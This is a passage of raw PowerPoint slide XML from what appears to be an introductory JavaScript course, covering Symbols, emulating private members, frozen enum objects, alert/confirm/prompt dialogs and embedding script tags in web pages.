                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>global_symbol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="fi-FI" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="fi-FI" sz="1400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI"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918359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C78C9CB-E24F-48CD-B025-8D23A99842AE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0"/>
              <a:t>Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0" err="1"/>
              <a:t>Symbols</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A27F877E-983E-4B1F-96A1-0E7C3ECD0B93}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="11247040" cy="4853136"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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Symbol</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local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symbol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with</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> no </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>description</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id2</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Symbol</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"id"</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local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symbol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with</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description</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id3</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Symbol</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"id"</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local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symbol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with</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description</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id2</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S</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id2</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description</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"id"</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id2</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false</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id2</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id3</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false</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g</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Symbol</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name</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global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symbol</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g2</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Symbol</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name</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global</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symbols</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with</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same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string</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are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same</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g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> === </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g2</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true</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g</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Symbol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Symbol</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keyFor</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g</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name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Symbol</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keyFor</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id2</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undefined</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="20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322826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C514B67-A3ED-4418-86FE-D783E145903F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Using Symbols to Emulate Private</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5C7475B0-060B-4FCD-BA6B-DED8A2EB6162}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4983162"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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privateMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Symbol</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privateMethod</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privateAttribute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Symbol</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privateAttribute</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class</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Person</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constructor</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name</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age</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this</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</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name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this</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privateAttribute</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age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privateMethod</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this</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privateAttribute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publicMethod</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this</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privateMethod</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var</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p</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a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Person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"John"</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25</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a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>p</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name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publicMethod</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privateMethod</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fails</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI"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767603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DA5C656-3265-4996-8403-3735FD9E2D9C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Frozen Symbols</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F54E12C-D959-43FC-8295-29A5B05C5CCF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4925144"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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const</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>DIRECTION</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Object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freeze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UP:</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up</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DOWN:</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down</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LEFT:</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left</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RIGHT:</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right</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const</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>GAME_STATE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Object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freeze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START:</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start</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start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> "menu"</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GAME:</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game</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level</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 1</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COMPLETE1:</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"complete1"</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level</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>completed</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GAME2:</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"game2"</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level</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 2</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WIN:</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win</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you</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won</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the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game</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LOSE:</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Symbol</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lose</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game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over</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let</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playerDirection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>DIRECTION</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>RIGHT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gameState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>GAME_STATE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>START</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI"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90498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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{02C731F9-1585-4951-85FA-1023BEE6BC0D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Window Methods for Dialogs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DBBB96C7-9457-485E-8691-F38C5DDF8F3D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8229600" cy="4829175"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>("text")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>displays the "text" and OK button to dismiss</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>confirm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>("text")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>displays the "text" and OK and cancel buttons. The confirm method returns true if user pressed OK and false for cancel</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>prompt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>("text", "default value")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>displays text and a one-line text input field and ok &amp; cancel buttons. The field is either empty or filled with "default value"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>the method returns the text string given by user </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>or null </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>if the user pressed cancel</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{785FD047-C931-485E-8579-8220520F63BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Placing JavaScript Code on a Webpage</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FD1A161D-8181-485A-9A0B-39FD803C2DFB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8229600" cy="5043488"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Embed inside a web page:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// your code goes here</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="alphaLcParenR"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>inside &lt;head&gt;, executed before web page loads</a:t>
            </a:r>
          </a:p>
          <a:p>
